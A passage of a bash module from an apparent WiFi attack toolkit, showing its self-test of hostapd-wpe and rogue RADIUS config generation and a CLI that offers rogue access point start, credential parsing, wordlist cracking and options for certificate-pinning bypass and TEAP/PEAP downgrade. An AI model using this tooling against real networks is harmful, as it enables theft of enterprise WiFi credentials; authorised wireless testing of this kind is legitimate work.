    printf 'freeradius\t%s\n'   "$(command -v freeradius >/dev/null 2>&1 && echo 1 || echo 0)"
    printf 'config_built\t%s\n' "$([[ -d "$X1_RR_DIR/conf" ]] && echo 1 || echo 0)"
}

# ── self-test ────────────────────────────────────────────────────────────
# Config generation only: this box has neither hostapd-wpe nor a WPE
# freeradius, so nothing here starts a daemon. Every mutable path (options,
# conf, certs, logs, rogue-radius tree) is redirected into scratch space so
# a real saved configuration is never overwritten.
x1_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local MOD_TMP="$X1_DIR/selftest"
    rm -rf "$MOD_TMP"; mkdir -p "$MOD_TMP"
    local s_opts="$X1_EAP_OPTS" s_conf="$X1_CONF" s_iface="${X1_IFACE:-}" s_log="$X1_LOG"
    local s_ca="$X1_CA_DIR" s_rrconf="$X1_RR_CONF" s_rrdir="$X1_RR_DIR"
    X1_EAP_OPTS="$MOD_TMP/eap_options.conf"
    X1_CONF="$MOD_TMP/hostapd-wpe.conf"
    X1_LOG="$MOD_TMP/dot1x.log"
    X1_CA_DIR="$MOD_TMP/certs"
    X1_IFACE="wlan0"
    X1_RR_CONF="$MOD_TMP/rogue_radius.conf"
    X1_RR_DIR="$MOD_TMP/rogue_radius"

    # 1. EAP method list -> hostapd eap_methods codes
    chk map-peap     "$(x1_methods_to_hostapd 'peap')"     25
    chk map-ttls     "$(x1_methods_to_hostapd 'ttls')"     21
    chk map-tls      "$(x1_methods_to_hostapd 'tls')"      13
    chk map-eap-tls  "$(x1_methods_to_hostapd 'eap-tls')"  13
    chk map-teap     "$(x1_methods_to_hostapd 'teap')"     55
    chk map-mschapv2 "$(x1_methods_to_hostapd 'mschapv2')" 26
    chk map-pair     "$(x1_methods_to_hostapd 'PEAP,TTLS')" 25,21
    chk map-all      "$(x1_methods_to_hostapd 'peap,ttls,eap-tls,teap,mschapv2')" 25,21,13,55,26
    chk map-case     "$(x1_methods_to_hostapd 'PeAp')"     25
    chk map-spaces   "$(x1_methods_to_hostapd ' peap , ttls ')" 25,21
    chk map-unknown  "$(x1_methods_to_hostapd 'bogus')"    25
    chk map-empty    "$(x1_methods_to_hostapd '')"         25
    chk map-mixed    "$(x1_methods_to_hostapd 'bogus,teap')" 55

    # 2. x1_write_conf with no saved options falls back to the documented
    #    defaults (PEAP+TTLS, TLS1.2, no forced PMF).
    rm -f "$X1_EAP_OPTS"
    x1_write_conf TestSSID 6
    chk conf-default-methods "$(grep -c '^eap_methods=25,21$' "$X1_CONF")" 1
    chk conf-default-wpa     "$(grep -c '^wpa_key_mgmt=WPA-EAP$' "$X1_CONF")" 1
    chk conf-default-pmf     "$(grep -c '^# ieee80211w not forced$' "$X1_CONF")" 1
    chk conf-default-no-tlsflags "$(grep -c '^tls_flags=' "$X1_CONF")" 0
    chk conf-default-no-pmf2 "$(grep -c '^ieee80211w=2$' "$X1_CONF")" 0
    chk conf-ssid            "$(grep -c '^ssid=TestSSID$' "$X1_CONF")" 1
    chk conf-channel         "$(grep -c '^channel=6$' "$X1_CONF")" 1
    chk conf-interface       "$(grep -c '^interface=wlan0$' "$X1_CONF")" 1
    chk conf-cert-path       "$(grep -c "^server_cert=$MOD_TMP/certs/server.pem\$" "$X1_CONF")" 1
    chk conf-eap-server      "$(grep -c '^eap_server=1$' "$X1_CONF")" 1

    # 3. Saved options MUST reach the generated config. Regression guard:
    #    the file was once written and then ignored, leaving a hardcoded
    #    config that silently ignored every method change.
    x1_wpa3_opts_save methods=TEAP tls_min=1.3 wpa3_mode=1 \
        wpa3_pinning=1 teap_downgrade=1 peap_strip=1 >/dev/null
    x1_write_conf CorpNet 36
    chk conf-saved-methods  "$(grep -c '^eap_methods=55$' "$X1_CONF")" 1
    chk conf-saved-tlsflags "$(grep -c '^tls_flags=V$' "$X1_CONF")" 1
    chk conf-saved-pmf      "$(grep -c '^ieee80211w=2$' "$X1_CONF")" 1
    chk conf-saved-wpa      "$(grep -c '^wpa_key_mgmt=WPA-EAP-SHA256$' "$X1_CONF")" 1
    chk conf-saved-pinning  "$(grep -c '^cert_pinning_bypass=1$' "$X1_CONF")" 1
    chk conf-saved-teap     "$(grep -c '^teap_inner_downgrade=1$' "$X1_CONF")" 1
    chk conf-saved-peap     "$(grep -c '^peap_to_tls_strip=1$' "$X1_CONF")" 1
    chk conf-saved-ssid     "$(grep -c '^ssid=CorpNet$' "$X1_CONF")" 1
    chk conf-saved-channel  "$(grep -c '^channel=36$' "$X1_CONF")" 1

    # ... and switching back to a single method really changes the config.
    x1_wpa3_opts_save methods=TTLS tls_min=1.2 wpa3_mode=0 >/dev/null
    x1_write_conf CorpNet 36
    chk conf-switch-methods  "$(grep -c '^eap_methods=21$' "$X1_CONF")" 1
    chk conf-switch-no-tlsflags "$(grep -c '^tls_flags=' "$X1_CONF")" 0
    chk conf-switch-no-pmf2  "$(grep -c '^ieee80211w=2$' "$X1_CONF")" 0
    chk conf-switch-wpa      "$(grep -c '^wpa_key_mgmt=WPA-EAP$' "$X1_CONF")" 1

    # 4. single-key option reader: saved value wins, default when absent
    chk eap-opt-saved   "$(x1_eap_opt methods)"        TTLS
    chk eap-opt-default "$(x1_eap_opt nosuchkey fb)"   fb
    chk eap-opt-none    "$(x1_eap_opt nosuchkey)"      ""

    # 5. WPA3 option save: rejected keys, no duplicates, TSV round-trip
    x1_wpa3_opts_save bogus=1 >/dev/null 2>&1
    chk wpa3-unknown-rc "$?" 2
    chk wpa3-unknown-kept "$(grep -c '^bogus=' "$X1_EAP_OPTS")" 0
    x1_wpa3_opts_save wpa3_mode=1 >/dev/null
    x1_wpa3_opts_save wpa3_mode=0 >/dev/null
    chk wpa3-no-duplicate "$(grep -c '^wpa3_mode=' "$X1_EAP_OPTS")" 1
    chk wpa3-last-wins    "$(x1_eap_opt wpa3_mode)" 0
    rm -f "$X1_CONF"
    local out
    out=$(x1_wpa3_opts_tsv)
    chk wpa3-tsv-config-absent "$(fld "$out" config_exists)" 0
    chk wpa3-tsv-methods "$(fld "$out" methods)" TTLS
    chk wpa3-tsv-tlsmin  "$(fld "$out" tls_min)" 1.2
    chk wpa3-tsv-eapmethods "$(fld "$out" eap_methods)" 21
    chk wpa3-tsv-rows    "$(printf '%s\n' "$out" | grep -c .)" 8
    x1_write_conf CorpNet 36
    chk wpa3-tsv-config-present "$(fld "$(x1_wpa3_opts_tsv)" config_exists)" 1

    # 6. EAP options save -> TSV round-trip
    x1_eap_options_save "PEAP,TTLS" "1.3" "10.0.0.5" "s3cr3t" "radius.test" >/dev/null
    out=$(x1_eap_options_get_tsv)
    chk eaptsv-methods    "$(fld "$out" methods)"      PEAP,TTLS
    chk eaptsv-tlsmin     "$(fld "$out" tls_min)"      1.3
    chk eaptsv-relayhost  "$(fld "$out" relay_host)"   10.0.0.5
    chk eaptsv-secret     "$(fld "$out" relay_secret)" s3cr3t
    chk eaptsv-cn         "$(fld "$out" cn)"           radius.test
    chk eaptsv-rows       "$(printf '%s\n' "$out" | grep -c .)" 5
    chk eaptsv-maps-to    "$(x1_methods_to_hostapd "$(fld "$out" methods)")" 25,21

    # 7. rogue RADIUS options: defaults, save/read, rejected keys
    chk rr-opt-default-chain "$(x1_rr_opt eap_chain 'peap,ttls')" peap,ttls
    chk rr-opt-default-port  "$(x1_rr_opt port '1812')"      1812
    chk rr-opt-none          "$(x1_rr_opt eap_chain)"        ""
    x1_rr_save eap_chain=teap,tls tls_min=1.3 port=1813 shared_secret=s3cr3t >/dev/null
    chk rr-opt-chain "$(x1_rr_opt eap_chain)"  teap,tls
    chk rr-opt-port  "$(x1_rr_opt port)"       1813
    chk rr-opt-tlsmin "$(x1_rr_opt tls_min)"   1.3
    x1_rr_save port=1814 >/dev/null
    chk rr-no-duplicate "$(grep -c '^port=' "$X1_RR_CONF")" 1
    chk rr-last-wins    "$(x1_rr_opt port)" 1814
    x1_rr_save bogus=1 >/dev/null 2>&1
    chk rr-unknown-rc  "$?" 2
    chk rr-unknown-kept "$(grep -c '^bogus=' "$X1_RR_CONF")" 0
    out=$(x1_rr_tsv)
    chk rr-tsv-running "$(fld "$out" running)" 0
    chk rr-tsv-pid     "$(fld "$out" pid)"     0
    chk rr-tsv-chain   "$(fld "$out" eap_chain)" teap,tls
    chk rr-tsv-methods "$(fld "$out" eap_methods)" 55,13
    chk rr-tsv-port    "$(fld "$out" port)"    1814
    chk rr-tsv-freeradius "$(fld "$out" freeradius)" \
        "$(command -v freeradius >/dev/null 2>&1 && echo 1 || echo 0)"

    # 8. rogue RADIUS config build. Two reachable shapes and the invariant
    #    that matters for both: CONFIG is printed ONLY when the tree was
    #    really built. Here /etc/freeradius is root-only, so the copy fails
    #    and the module must say why instead of reporting a built config.
    x1_rr_save shared_secret=s3cr3t port=1813 >/dev/null
    out=$(x1_rr_build_config 2>&1); local rc=$?
    local cfg
    cfg=$(printf '%s\n' "$out" | awk -F'\t' '$1=="CONFIG"{print $2}')
    if (( rc == 0 )); then
        chk rr-build-dir "$cfg" "$X1_RR_DIR/conf"
        chk rr-build-clients-exists "$([[ -f "$X1_RR_DIR/conf/clients.conf" ]] && echo 1 || echo 0)" 1
        chk rr-build-secret "$(grep -c '^    secret = s3cr3t$' "$X1_RR_DIR/conf/clients.conf")" 1
        chk rr-build-nas "$(grep -c '^    ipaddr = 127.0.0.1$' "$X1_RR_DIR/conf/clients.conf")" 1
        local eapf=""
        for f in "$X1_RR_DIR/conf/mods-enabled/eap" "$X1_RR_DIR/conf/mods-available/eap"; do
            [[ -f "$f" ]] && { eapf="$f"; break; }
        done
        if [[ -n "$eapf" ]]; then
            chk rr-build-tlsmin "$(grep -c 'tls_min_version = "1.3"' "$eapf")" 1
            chk rr-build-key    "$(grep -c "private_key_file = $X1_CA_DIR/server.key" "$eapf")" 1
        fi
    else
        chk rr-build-fail-named "$(printf '%s\n' "$out" | grep -c '^ERROR')" 1
        chk rr-build-fail-no-config "$(printf '%s\n' "$out" | grep -c '^CONFIG')" 0
        chk rr-build-fail-no-dir "$cfg" ""
    fi

    # 9. argument validation and backend detection (no hardware touched)
    x1_cli_start >/dev/null 2>&1;        chk start-usage-rc  "$?" 2
    x1_cli_start wlan0 Ssid >/dev/null 2>&1; chk start-usage-rc2 "$?" 2
    chk backend-known "$(x1_detect_backend | grep -cE '^(hostapd-wpe|freeradius-wpe|hostapd|none)$')" 1
    if ! command -v asleap >/dev/null 2>&1; then
        out=$(x1_check_deps 2>&1); rc=$?
        chk deps-missing-rc  "$rc" 1
        chk deps-names-asleap "$(printf '%s\n' "$out" | grep -c 'asleap')" 1
    else
        out=$(x1_check_deps 2>&1); chk deps-ready "$(printf '%s\n' "$out" | grep -c '^READY')" 1
    fi

    X1_EAP_OPTS="$s_opts"; X1_CONF="$s_conf"; X1_LOG="$s_log"
    X1_CA_DIR="$s_ca"; X1_RR_CONF="$s_rrconf"; X1_RR_DIR="$s_rrdir"
    if [[ -n "$s_iface" ]]; then X1_IFACE="$s_iface"; else unset X1_IFACE; fi
    rm -rf "$MOD_TMP"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

x1_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)         x1_cli_status_tsv ;;
        --check-deps)         x1_check_deps ;;
        --list-ifaces-tsv)    x1_cli_list_ifaces_tsv ;;
        --start)              x1_cli_start "$@" ;;
        --stop)               x1_cli_stop ;;
        --parse-creds)        x1_cli_parse_creds ;;
        --auto-crack)         x1_cli_auto_crack "$@" ;;
        --detect-method)      x1_cli_detect_method ;;
        --gen-certs)          x1_cli_gen_certs "$@" ;;
        --cert-info-tsv)      x1_cert_info_tsv ;;
        --eap-options-save)   x1_eap_options_save "$@" ;;
        --eap-options-tsv)    x1_eap_options_get_tsv ;;
        --recon-tsv)          x1_cli_recon_tsv "$@" ;;
        --wpa3-save)          x1_wpa3_opts_save "$@" ;;
        --wpa3-tsv)           x1_wpa3_opts_tsv ;;
        --rogue-radius-start) x1_rr_start ;;
        --rogue-radius-stop)  x1_rr_stop ;;
        --rogue-radius-save)  x1_rr_save "$@" ;;
        --rogue-radius-tsv)   x1_rr_tsv ;;
        --rogue-radius-creds) x1_rr_creds ;;
        --rogue-radius-init)  x1_rr_build_config ;;
        --selftest)           x1_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --check-deps
  --list-ifaces-tsv
  --start IFACE SSID CHANNEL
  --stop
  --parse-creds
  --auto-crack [WORDLIST]
  --detect-method
  --gen-certs [CN]
  --cert-info-tsv
  --eap-options-save METHODS TLS_MIN RELAY_HOST RELAY_SECRET CN
  --eap-options-tsv
  --recon-tsv [DURATION] [IFACE]
  --wpa3-save KEY=VALUE ...   (methods, tls_min, wpa3_mode,
                               wpa3_pinning, teap_downgrade, peap_strip)
  --wpa3-tsv
  --rogue-radius-start | --rogue-radius-stop | --rogue-radius-init
  --rogue-radius-save KEY=VALUE ...  (eap_chain, cert_mode, tls_min,
                                      inner_method, shared_secret, port)
  --rogue-radius-tsv | --rogue-radius-creds
  --selftest
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    command -v ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    x1_cli_main "$@"
fi
